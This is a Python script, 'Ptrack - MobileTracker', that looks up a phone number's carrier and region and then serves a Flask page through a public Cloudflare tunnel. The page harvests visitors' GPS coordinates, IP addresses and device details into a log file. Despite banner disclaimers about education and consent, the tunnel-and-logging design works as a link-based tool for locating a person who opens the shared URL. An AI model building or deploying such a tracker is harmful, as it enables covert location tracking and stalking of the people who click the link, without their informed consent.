import sys
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from flask import Flask, request, render_template
import socket
import requests
import webbrowser
from geopy.geocoders import Nominatim
from datetime import datetime
import os
import subprocess
import threading
import time


# ========== Banner ==========
def show_banner():
    print(r"""
      ________________________
                    < Ptrack - MobileTracker > 
                    ------------------------
   \         ,        ,
    \       /(        )

     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |

-^--'`<     '
          (_.)  _  )   /
           .___/    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    --' .__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/


🔎 Phone & Location Tracker
👨‍💻 Author: Purple Ranger
contact: mailto:purplehub@aol.com
whatsapp:https://wa.link/nhd7st
site: https://purplehub.serveo.net
          📱 Enhanced Phone & Location Tracking
⚠️ Note: This script is for educational purposes only.
⚠️ Use responsibly and ethically.
⚠️ Do not use this script for malicious purposes.
⚠️ Ensure you have permission to track the phone number.
⚠️ NOTE: Do NOT use this script without user consent.
    """)

# ========== Phone Intelligence ==========
def phone_number_info(phone_number):
    try:
        phone_number = phone_number.strip()
        if not (phone_number.startswith('+') or phone_number.startswith('00')):
            return "❌ Please provide a valid phone number with country code (e.g., +14155552671)."

        number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(number):
            return "⚠️ The number is not valid."

        region = geocoder.description_for_number(number, 'en')
        provider = carrier.name_for_number(number, 'en')
        timezones = timezone.time_zones_for_number(number)

        info = {
            " Number": phone_number,
            " Region": region,
            " Carrier": provider,
            " Timezone(s)": ", ".join(timezones),
            " Valid": phonenumbers.is_valid_number(number),
            " Possible": phonenumbers.is_possible_number(number),
            " E164 Format": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.E164),
            " International": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            " National": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.NATIONAL),
        }

        result = "\n".join([f"{key}: {value}" for key, value in info.items()])
        return result
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

# ========== Location Intelligence ==========
def get_location_info(lat=None, lon=None, acc=None, gps_denied=False, ip=None):
    try:
        if gps_denied or lat is None or lon is None:
            ip_data = requests.get(f"http://ip-api.com/json/{ip}").json()
            city = ip_data.get("city", "Unknown")
            region = ip_data.get("regionName", "Unknown")
            country = ip_data.get("country", "Unknown")
            return f"🌍 IP-based Location: {city}, {region}, {country}"
        else:
            geolocator = Nominatim(user_agent="phone_location")
            location = geolocator.reverse((lat, lon))
            return f"📍 GPS Location: {location.address} (Accuracy: {acc} meters)\nGoogle Maps: https://www.google.com/maps?q={lat},{lon}"
    except Exception as e:
        return f"⚠️ Error fetching location: {str(e)}"

# ========== Flask App ==========
app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    ip = request.remote_addr
    timestamp = str(datetime.now())

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("acc")
    gps_denied = data.get("gps_denied", False)

    device_info = data.get("device_info", {})
    location_info = get_location_info(lat=lat, lon=lon, acc=acc, gps_denied=gps_denied, ip=ip)

    # Print to console
    print("\n===== 📱 Visitor Report =====")
    print(f"🕒 Time: {timestamp}")
    print(f"🌐 IP Address: {ip}")
    print(f"{location_info}")
    print("--- Device Info ---")
    for key, value in device_info.items():
        print(f"{key}: {value}")
    print("==============================\n")

    # Save to file
    log_entry = {
        "time": timestamp,
        "ip": ip,
        "gps_denied": gps_denied,
        "lat": lat,
        "lon": lon,
        "accuracy": acc,
        "location_info": location_info,
        "device_info": device_info
    }

    with open("visitor_logs.txt", "a") as f:
        f.write(str(log_entry) + "\n")

    return '', 204

# ========== Show Phone Info ==========
def show_phone_info():
    if len(sys.argv) < 2:
        print("Usage: python3 ptrack.py <phone_number>\n")
        sys.exit(1)
    else:
        phone_number = sys.argv[1]
        result = phone_number_info(phone_number)
        print(result)
        print("\n🔗 Visit the link to check location: http://localhost")
        print("🚀 Starting local Flask server for tracking...\n")


def start_cloudflare_tunnel():
    try:
        print("☁️  Starting Cloudflare Tunnel on port 5000...")
        tunnel_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        # Monitor output to extract and print the public URL
        def monitor_output():
            for line in tunnel_process.stdout:
                print("🌐", line.strip())
                if "https://" in line and "trycloudflare.com" in line:
                    url = line.strip().split()[-1]
                    print(f"\n🚀 Public URL: {url}\n")
                    break

        threading.Thread(target=monitor_output, daemon=True).start()
        return tunnel_process

    except FileNotFoundError:
        print("❌ Error: 'cloudflared' not found. Install it from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
        sys.exit(1)

# ========== Main ==========
def main():
    show_banner()
    show_phone_info()
    start_cloudflare_tunnel()
    time.sleep(5)  # Wait briefly to ensure tunnel starts
    webbrowser.open("http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)


# ========== Run ==========
if __name__ == "__main__":
    main()
